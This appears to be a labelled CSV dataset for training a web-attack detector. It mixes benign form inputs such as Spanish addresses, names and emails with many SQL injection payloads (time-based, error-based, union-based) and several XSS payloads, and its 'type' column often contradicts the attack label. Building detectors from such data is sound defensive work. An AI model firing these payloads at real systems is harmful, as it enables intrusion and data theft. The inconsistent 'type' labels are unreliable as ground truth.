Text,attack_type,Label,type
"1"") rlike sleep(5) and (""efoq"" like ""efoq",sqli,1,normal
43751883h,norm,0,normal
"gredos, 114 12?g",norm,0,normal
10302390t,norm,0,normal
1')) order by 1#,sqli,1,normal
"calle santa teresa, 87 5?b",norm,0,normal
"1') or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and ('xzlx' like 'xzlx",sqli,1,sql
carcaixent,norm,0,normal
"1"") and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (""kkim""=""kkim",sqli,1,sql
4033,norm,0,normal
samieian7,norm,0,normal
nilsa,norm,0,normal
45478096n,norm,0,normal
"1 and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))-- kegk",sqli,1,sql
"1'+(select 'zgtu' where 8419=8419;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",sqli,1,sql
xixia,norm,0,normal
6534,norm,0,normal
pistan robredo,norm,0,normal
benala de las villas,norm,0,normal
1350447535832439,norm,0,normal
"1';select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and 'gpeo' like 'gpeo",sqli,1,sql
"1"" or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and ""ekjs"" like ""ekjs",sqli,1,sql
1' and (select * from (select(sleep(5)))gcrr)#,sqli,1,sql
hogu1ra,norm,0,normal
"-9432)) as nqya where 8387=8387 or elt(9242=6180,6180)--",sqli,1,sql
"1 where 1096=1096 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))--",sqli,1,sql
"1""));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ((""qkat""=""qkat",sqli,1,sql
"1'||(select 'hdpi' where 5620=5620 and make_set(8403=8403,8899))||'",sqli,1,sql
80029600l,norm,0,normal
maeya,norm,0,normal
"1'))) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ((('owot'='owot",sqli,1,sql
"-5097') union all select 8992,8992,8992,8992,8992,8992,8992,8992,8992--",sqli,1,sql
26532,norm,0,normal
14188360m,norm,0,normal
trumbull.presie@esbien.pk,norm,0,normal
c09so18,norm,0,normal
alcntar,norm,0,normal
">""<base href=""javascript:document.cookie=true;//"">",xss,2,xss
50610,norm,0,normal
"1;select like('abcdefg',upper(hex(randomblob(500000000/2))))# lchh",sqli,1,sql
"1"") as zbhs where 2017=2017 or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)--",sqli,1,sql
gingeric,norm,0,normal
vanderbu,norm,0,normal
"1%' and elt(4249=4249,7259) and '%'='",sqli,1,normal
"-1<xml id=""crosssitescripting""><i><b><img src=""javas<!-- -->cript:document.cookie=true""></b></i></xml><span datasrc=""#crosssitescripting"" datafld=""b"" dataformatas=""html""></span>",xss,2,sql
36930027p,norm,0,normal
fany,norm,0,normal
1'+(select rdwb where 2498=2498 and 3429=7639--,sqli,1,sql
4405692863089329,norm,0,normal
"-9622' union all select 7208,7208,7208,7208#",sqli,1,sql
7099741162484696,norm,0,normal
villoresi@n340magazin.tc,norm,0,normal
"1) as sdnd where 9472=9472;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual--",sqli,1,sql
00505336a,norm,0,normal
"carretera barajas, 147,",norm,0,normal
1423186093193887,norm,0,normal
18126,norm,0,normal
re53nc19g93s8,norm,0,normal
abia de la obispala,norm,0,normal
1818801431707826,norm,0,normal
"1)));select like('abcdefg',upper(hex(randomblob(500000000/2)))) and (((6051=6051",sqli,1,sql
"1%')));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ((('%'='",sqli,1,sql
"1"") where 1673=1673 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",sqli,1,sql
2420548941226708,norm,0,normal
raab,norm,0,normal
van_bake,norm,0,normal
"1 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))-- huss",sqli,1,sql
dac@eonon.com.cy,norm,0,normal
"1%' or elt(5873=5873,sleep(5))#",sqli,1,normal
"1') as nexa where 6740=6740;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",sqli,1,sql
calle begoazpi 5 7?f,norm,0,normal
-7230') or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('khtc'='khtc,sqli,1,sql
calle nicolas funes 116,norm,0,normal
20110,norm,0,normal
sedran,norm,0,normal
passeig nord 23 8b,norm,0,normal
"1' in boolean mode) or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
jolgorio,norm,0,normal
atab?a6ad7,norm,0,normal
"calle escritor bono i barber, 132, 2?b",norm,0,normal
padiernos,norm,0,normal
1') or sleep(5) and ('mdmr' like 'mdmr,sqli,1,normal
"1"")) as svim where 4924=4924 and 7932=5870",sqli,1,normal
"font d'en canyelles 21, 1-b",norm,0,normal
p563l5os1,norm,0,normal
enconadura,norm,0,normal
igal,norm,0,normal
"1) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and (5220=5220",sqli,1,sql
1');begin dbms_lock.sleep(5); end and ('hmtt' like 'hmtt,sqli,1,sql
santibez de ecla,norm,0,normal
1')) and 7230=2517,sqli,1,normal
"1',(select (case when (8596=8596) then 1 else 8596*(select 8596 from mysql.db) end))",sqli,1,sql
kallewar,norm,0,normal
sabino,norm,0,normal
"-7240')) union all select 8064,8064,8064#",sqli,1,sql
teller@asesoriaviesca.edu,norm,0,normal
blanquer,norm,0,normal
"1)) as pxmz where 2596=2596;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",sqli,1,sql
bento,norm,0,normal
1305903950385552,norm,0,normal
"c/ andres piquer 175, 2?b",norm,0,normal
83475055m,norm,0,normal
09540,norm,0,normal
faust2@cocheacoche.cg,norm,0,normal
kiam,norm,0,normal
espavorida,norm,0,normal
81208495a,norm,0,normal
5139,norm,0,normal
hargreav,norm,0,normal
graziana,norm,0,normal
08775,norm,0,normal
palenque,norm,0,normal
destullecer,norm,0,normal
ja34ico,norm,0,normal
"calle espio, 120, 11?a",norm,0,normal
"calle orion 74,",norm,0,normal
9713391343478091,norm,0,normal
"1'+(select 'nzgq' where 7230=7230 and elt(1210=1210,sleep(5)))+'",sqli,1,sql
en2re7e4hu16,norm,0,normal
e3c7i3tu3a,norm,0,normal
villazn peters,norm,0,normal
"-1<div datafld=""b"" dataformatas=""html"" datasrc=""#x""></div> ]]> [a][a]script>document.cookie=true;[a][a]/script>",xss,2,sql
"1 where 7932=7932 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))--",sqli,1,sql
78595518x,norm,0,normal
"1"") where 3122=3122 and sleep(5)#",sqli,1,normal
arenas,norm,0,normal
"-1<img src=""blah""onmouseover=""document.cookie=true;"">",xss,2,sql
91438020w,norm,0,normal
1) as jtfx where 8038=8038;select sleep(5)--,sqli,1,sql
8418395367383016,norm,0,normal
"-1920'))) union all select 1424,1424,1424,1424,1424,1424,1424,1424,1424,1424#",sqli,1,sql
22430,norm,0,normal
regir,norm,0,normal
lena,norm,0,normal
26857148w,norm,0,normal
scott,norm,0,normal
chuchazo,norm,0,normal
ruperta,norm,0,normal
oplinger,norm,0,normal
portas casola,norm,0,normal
"1' where 8749=8749 or 8421=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
matizar,norm,0,normal
tornos,norm,0,normal
braa,norm,0,normal
c/ maria de padilla 5 12a,norm,0,normal
1';begin user_lock.sleep(5); end and 'hizd'='hizd,sqli,1,sql
br8c99ma4290,norm,0,normal
co65025,norm,0,normal
2160,norm,0,normal
"1"") or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (""zbwn"" like ""zbwn",sqli,1,normal
23698990c,norm,0,normal
"1' and elt(1533=5695,5695) and 'ycgi'='ycgi",sqli,1,normal
bagot alzogaray,norm,0,normal
1'))) waitfor delay '0:0:5' and ((('zhhf' like 'zhhf,sqli,1,normal
2689,norm,0,normal
3685717385941815,norm,0,normal
pafilis,norm,0,normal
cimorra,norm,0,normal
"1' and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and 'qcsi'='qcsi",sqli,1,sql
"calle tren, 56 6?d",norm,0,normal
andosilla,norm,0,normal
gesino,norm,0,normal
1))) or (select * from (select(sleep(5)))sddo)#,sqli,1,sql
"-7460"" union all select 4273,4273,4273,4273,4273,4273,4273,4273#",sqli,1,sql
"1')) as omwk where 1414=1414 and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)--",sqli,1,sql
terribas,norm,0,normal
calle marques de santillana 146 9b,norm,0,normal
"1,iif(7475=7475,1,1/0)",sqli,1,normal
denostable,norm,0,normal
"ampolla, l'",norm,0,normal
"-9881"")) or 9850=8118#",sqli,1,normal
98501968y,norm,0,normal
1'||(select 'oxas' from dual where 8284=8284 or sleep(5))||',sqli,1,sql
brazzi@cortell.gs,norm,0,normal
sabiela,norm,0,normal
-8447 where 2850=2850 or 7147=3262,sqli,1,normal
2936466219545326,norm,0,normal
"1"" where 4319=4319;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",sqli,1,sql
iraola rudi,norm,0,normal
"c/ vapor, 148, 2?a",norm,0,normal
"1')) as ezpq where 2976=2976 union all select null,null,null,null,null,null,null,null,null,null#",sqli,1,sql
"pl. cantarranillas 21,",norm,0,normal
"1"") where 9648=9648 and elt(1210=1210,sleep(5))--",sqli,1,sql
thuthuy,norm,0,normal
"1"") as zovk where 4591=4591 or 4240=(select 4240 from pg_sleep(5))--",sqli,1,sql
0085184895968394,norm,0,normal
"-3205"") union all select 5233,5233,5233,5233#",sqli,1,sql
"1'+(select jidy where 2989=2989 procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",sqli,1,sql
clarance6,norm,0,normal
75994493d,norm,0,normal
michell4@so-tel.jobs,norm,0,normal
01839,norm,0,normal
"1')) as lmsl where 3753=3753 or elt(5873=5873,sleep(5))#",sqli,1,normal
"1' in boolean mode) or 8514=benchmark(5000000,md5(0x544d5a4c))#",sqli,1,normal
"1%'))) union all select null,null,null,null,null#",sqli,1,sql
acedera,norm,0,normal
">""<img style=""crosssitescripting:expr/*crosssitescripting*/ession(document.cookie=true)"">",xss,2,sql
ramesh,norm,0,normal
-s9rete,norm,0,normal
1'||(select 'ytwz' from dual where 3025=3025 and (5039=5303)*5303)||',sqli,1,sql
"1%')) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (('%'='",sqli,1,normal
02624260y,norm,0,normal
paovarat_christian-gerard@audiosat.mp,norm,0,normal
1'))) and (3020=3020)*6703 and ((('qfxg'='qfxg,sqli,1,normal
"calle linne, 9",norm,0,normal
"-7119"") or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and (""rmzm""=""rmzm",sqli,1,sql
"1') and elt(3114=3114,sleep(5))#",sqli,1,normal
capella,norm,0,normal
abades,norm,0,normal
19127,norm,0,normal
"+49/>""<iframe src=http://vulnerability-lab.com>1337",xss,2,normal
31392,norm,0,normal
abrasador,norm,0,normal
"1%';select count(*) from generate_series(1,5000000) and '%'='",sqli,1,sql
"-2325) union all select 4692,4692,4692,4692#",sqli,1,sql
92540376z,norm,0,normal
"1%' union all select null,null,null,null,null,null,null,null,null--",sqli,1,sql
23,norm,0,normal
"-4954%"") or 5244=4832",sqli,1,normal
algodre,norm,0,normal
16144,norm,0,normal
"1'))) and make_set(8403=8403,8899) and ((('zxon' like 'zxon",sqli,1,normal
graciano,norm,0,normal
ce7a964na,norm,0,normal
charpini_daillie@inmobiliariahangar.ly,norm,0,normal
"1' or 8514=benchmark(5000000,md5(0x544d5a4c))#",sqli,1,normal
83042756z,norm,0,normal
43426,norm,0,normal
"1""))) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (((""ecoa"" like ""ecoa",sqli,1,sql
5076820691273276,norm,0,normal
"1"") or sleep(5) and (""xgtk""=""xgtk",sqli,1,normal
"1')) union all select null,null,null,null,null,null,null,null,null--",sqli,1,sql
alred,norm,0,normal
-9446)) as wmrq where 3705=3705 union all select 3705#,sqli,1,sql
"1%'))) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((('%'='",sqli,1,sql
dybenko,norm,0,normal
8970308470180045,norm,0,normal
"-4947' in boolean mode) union all select 3314,3314#",sqli,1,sql
1'||(select 'xglm' from dual where 3556=3556 or 4240=(select 4240 from pg_sleep(5))--,sqli,1,sql
elwes@enla.nu,norm,0,normal
brincones,norm,0,normal
mcinerne,norm,0,normal
27268,norm,0,normal
lorraine,norm,0,normal
"1"") where 2445=2445;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",sqli,1,sql
1 where 8889=8889;if(7899=7899) select 7899 else drop function zbbp--,sqli,1,sql
gabriela1,norm,0,normal
"c/ domingo de betanzos s/n,",norm,0,normal
castellnou de bages,norm,0,normal
solana de los barros,norm,0,normal
laurencia,norm,0,normal
5546391843457163,norm,0,normal
12,norm,0,normal
63545647m,norm,0,normal
norea,norm,0,normal
15719676g,norm,0,normal
sparksma,norm,0,normal
1%'));select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,sqli,1,sql
aburelado,norm,0,normal
edilio,norm,0,normal
nues2ra,norm,0,normal
"1"")) as gvpm where 5170=5170 or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
49130,norm,0,normal
"-6253' union all select 5756,5756,5756,5756,5756,5756,5756,5756,5756,5756#",sqli,1,sql
maggee,norm,0,normal
1' where 5335=5335;select pg_sleep(5)--,sqli,1,sql
"1 or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
"-6457 where 1764=1764 union all select 1764,1764,1764,1764,1764,1764,1764,1764--",sqli,1,sql
arabele,norm,0,normal
"-1269' or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and 'gohv' like 'gohv",sqli,1,sql
"1,(select (case when (5334=4976) then 1 else cast(1 as int)/(select 0 from dual) end) from dual)",sqli,1,sql
46842,norm,0,normal
"c/ virgen de la almudena, 61 12?c",norm,0,normal
"-4558"" or (3965=3933)*3933 and ""hmdb"" like ""hmdb",sqli,1,normal
"1' and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and 'hhbh'='hhbh",sqli,1,sql
"1"" where 1166=1166;select pg_sleep(5)--",sqli,1,sql
730,norm,0,normal
ciolli_heesters6@zeat.es,norm,0,normal
"1%'))) or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
josu,norm,0,normal
1) where 9344=9344;select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,sqli,1,sql
gavald,norm,0,normal
1')) and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (('guxv'='guxv,sqli,1,sql
4354c07a,norm,0,normal
"1';select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and 'vhvh'='vhvh",sqli,1,sql
31819774x,norm,0,normal
"1')) as iipj where 6560=6560;select count(*) from generate_series(1,5000000)--",sqli,1,sql
"1) as qzif where 7877=7877 union all select null,null,null,null,null,null,null--",sqli,1,sql
8087,norm,0,normal
dey,norm,0,normal
"antelo y mario, 192,",norm,0,normal
kalil,norm,0,normal
"1'+(select basp where 6953=6953;iif(5257=5257,1,1/0)",sqli,1,sql
waneta,norm,0,normal
ben-isha,norm,0,normal
3772,norm,0,normal
3309243329438501,norm,0,normal
bernaden,norm,0,normal
1');select (case when (4719=8852) then 1 else 4719*(select 4719 from master..sysdatabases) end)--,sqli,1,sql
"1"")));select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#",sqli,1,sql
72935768p,norm,0,normal
98367013s,norm,0,normal
_bielda,norm,0,normal
"de can clos, 162",norm,0,normal
sams agea,norm,0,normal
04271,norm,0,normal
grandura,norm,0,normal
"1')) and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (('mymg'='mymg",sqli,1,sql
"1';select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and 'hvqt'='hvqt",sqli,1,sql
"1""))) and elt(1210=1210,sleep(5)) and (((""ilge"" like ""ilge",sqli,1,normal
-6222)) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((3230=3230,sqli,1,sql
transbordar,norm,0,normal
carlos tomas romero 130,norm,0,normal
c/ san ildefonso 106 10?h,norm,0,normal
puente la reina/gares,norm,0,normal
5155735586136937,norm,0,normal
32893899n,norm,0,normal
6736,norm,0,normal
desabor$ida,norm,0,normal
"<img src=""blah""onmouseover=""document.cookie=true;"">",xss,2,sql
1') as jxtg where 1071=1071 and sleep(5)--,sqli,1,sql
"1"")) as vdbf where 7969=7969 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))--",sqli,1,sql
homobono valds,norm,0,normal
ermina,norm,0,normal
asander1@nutrimama.do,norm,0,normal
"1'))) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((('jueq'='jueq",sqli,1,normal
540,norm,0,normal
1')) and 6690=3250#,sqli,1,normal
"-4889"")) as vvuo where 8060=8060 or (8459=8459)*4906--",sqli,1,sql
men@altoguadiana.pw,norm,0,normal
84881293t,norm,0,normal
<style><!--</style><script>alert('xss');//--></script>,xss,2,xss
"1) as ewnv where 3393=3393 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
yepes@enla.mg,norm,0,normal
47318,norm,0,normal
21924971z,norm,0,normal
madisett,norm,0,normal
1882,norm,0,normal
lemuels.buffi-landi@hostingprofessional.com.la,norm,0,normal
"c/ salvatella, 98 11?h",norm,0,normal
anteda,norm,0,normal
9557381014556334,norm,0,normal
arenas burrull,norm,0,normal
"1 and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))-- wynp",sqli,1,sql
eduarda,norm,0,normal
2u27lad9r4,norm,0,normal
"-1<link rel=""stylesheet"" href=""javascript:document.cookie=true;"">",xss,2,xss
comite9t0,norm,0,normal
contrabasa,norm,0,normal
97925933y,norm,0,normal
"1"") where 6367=6367 union all select null,null,null,null,null,null,null#",sqli,1,sql
amaja,norm,0,normal
1') where 3311=3311;select (case when (4572=4086) then 1 else 4572*(select 4572 from master..sysdatabases) end)--,sqli,1,sql
"c/ murillo, 106 5c",norm,0,normal
1'+(select 'rsgi' where 2258=2258;(select * from (select(sleep(5)))srmq))+',sqli,1,sql
31788831w,norm,0,normal
tottenham@satellites.py,norm,0,normal
quintanilla de urz,norm,0,normal
"1')) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (('gyre'='gyre",sqli,1,sql
moffatt@icodea.mq,norm,0,normal
walmsley@custombikesclothes.gd,norm,0,normal
"1"") or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",sqli,1,sql
1') and 6969=(select 6969 from pg_sleep(5)) and ('ayol'='ayol,sqli,1,sql
mathieso,norm,0,normal
gareth,norm,0,normal
"1%"")));begin user_lock.sleep(5); end--",sqli,1,sql
"-2803') as jciy where 1130=1130 or make_set(4599=6550,6550)--",sqli,1,sql
03759,norm,0,normal
"1'))) and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
olmstead@ballerpoker.tr,norm,0,normal
kashef,norm,0,normal
5370,norm,0,normal
se5ap62o,norm,0,normal
pages@spainbb.kh,norm,0,normal
"1"")) or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
"1%"") and elt(7436=9874,9874) and (""%""=""",sqli,1,normal
16140,norm,0,normal
entrever,norm,0,normal
57186589x,norm,0,normal
4698577318753037,norm,0,normal
5900,norm,0,normal
"1"") as yzny where 4869=4869 rlike (select * from (select(sleep(5)))sgvo)--",sqli,1,sql
c4oat5,norm,0,normal
"1' and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and 'wjwn'='wjwn",sqli,1,sql
28430,norm,0,normal
aurora bertrana salazar 10 3-c,norm,0,normal
1')));select case when 7717=7717 then 1 else null end--,sqli,1,sql
hilton,norm,0,normal
"1') or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ('gmil'='gmil",sqli,1,sql
em7590du4a,norm,0,normal
1'+(select ahyw where 6893=6893 waitfor delay '0:0:5'--,sqli,1,sql
midkiff_mikuni@directoriogratuito.kh,norm,0,normal
illano,norm,0,normal
casserres,norm,0,normal
"1%"";select (case when (7005=7118) then 1 else 7005*(select 7005 from master..sysdatabases) end)--",sqli,1,sql
41950,norm,0,normal
5ua5teo,norm,0,normal
05848,norm,0,normal
lheureux,norm,0,normal
"1'))) and elt(1210=1210,sleep(5)) and ((('acdu'='acdu",sqli,1,normal
adria,norm,0,normal
vannuchhi_ecoffery@hotelesjerez.vc,norm,0,normal
"1 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))",sqli,1,sql
potrear,norm,0,normal
43134733g,norm,0,normal
9362,norm,0,normal
"""><iframe src=a onload=alert(""vl"") <",xss,2,xss
abaco,norm,0,normal
letha,norm,0,normal
aufaure@asesoriaviesca.bj,norm,0,normal
itter,norm,0,normal
34809530l,norm,0,normal
1) where 6884=6884 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--,sqli,1,sql
"1') and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",sqli,1,sql
"1""))) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (((""msjh"" like ""msjh",sqli,1,sql
cerinza,norm,0,normal
1') where 2753=2753 and (2739=8047)*8047--,sqli,1,sql
1));select sleep(5) and ((3404=3404,sqli,1,sql
kappeler-flick@probandoo.mobi,norm,0,normal
rafart baquer,norm,0,normal
caizares,norm,0,normal
"1""))) rlike sleep(5) and (((""eefg""=""eefg",sqli,1,normal
strade_rosenthal@latiendadecolchones.kr,norm,0,normal
54925627v,norm,0,normal
"calle hernandez iglesias, 160,",norm,0,normal
"1"" and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
"1"") and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and (""rfpq""=""rfpq",sqli,1,sql
1%';waitfor delay '0:0:5'--,sqli,1,sql
shihhai0,norm,0,normal
36574,norm,0,normal
"1'||(select 'pygt' from dual where 5543=5543 union all select null,null,null,null,null,null#",sqli,1,sql
calle virgen de begoa 19,norm,0,normal
guilas,norm,0,normal
7756,norm,0,normal
ar2e5tad6,norm,0,normal
50133,norm,0,normal
villalba de los barros,norm,0,normal
boagne,norm,0,normal
"c/ vilagarcia de arousa, 188,",norm,0,normal
mallett-shibata@tisanuro.cc,norm,0,normal
caster@videotubo.pr,norm,0,normal
"-8209) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",sqli,1,sql
"-3102) union all select 6707,6707,6707,6707--",sqli,1,sql
me9ieval,norm,0,normal
"1"" where 4991=4991 or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",sqli,1,sql
signoret@pisossantcugat.cat,norm,0,normal
1664,norm,0,normal
makeda,norm,0,normal
atmetll farrer,norm,0,normal
17115248m,norm,0,normal
37576555y,norm,0,normal
atrazar,norm,0,normal
"calle palmito, s/n, 12?g",norm,0,normal
wady,norm,0,normal
corzn ascencao,norm,0,normal
cuevas labradas,norm,0,normal
"san roke, 155 13?h",norm,0,normal
nickonov,norm,0,normal
"1%')) and make_set(8403=8403,8899) and (('%'='",sqli,1,normal
calle asturias 158 6h,norm,0,normal
euzaine@schnapps.com.gs,norm,0,normal
7555972134845296,norm,0,normal
8772381547327931,norm,0,normal
perendengue,norm,0,normal
"-4148%""))) or (8459=8459)*4906 and (((""%""=""",sqli,1,normal
adverbializar,norm,0,normal
1433,norm,0,normal
"corredera alta de san pablo, 110,",norm,0,normal
48asta5o,norm,0,normal
0576780057374879,norm,0,normal
"1' or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and 'nazb'='nazb",sqli,1,sql
1') where 8707=8707 and 3210=1477--,sqli,1,sql
borrachero muros,norm,0,normal
03895518p,norm,0,normal
"-6906' where 1839=1839 union all select 1839,1839,1839,1839,1839--",sqli,1,sql
"1"")) as bosq where 4695=4695;select benchmark(5000000,md5(0x714e4153))#",sqli,1,sql
sati1f4ctori4,norm,0,normal
"1"") as hblk where 7982=7982 and 9611=6142--",sqli,1,sql
"1')) as nxhp where 2649=2649 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
gurica4,norm,0,normal
"1 and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))",sqli,1,normal
1) and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric),sqli,1,sql
pedrosa de duero,norm,0,normal
49180,norm,0,normal
8187933615095972,norm,0,normal
rozsabegyi.kasker@mirata.ls,norm,0,normal
andoain,norm,0,normal
smoot,norm,0,normal
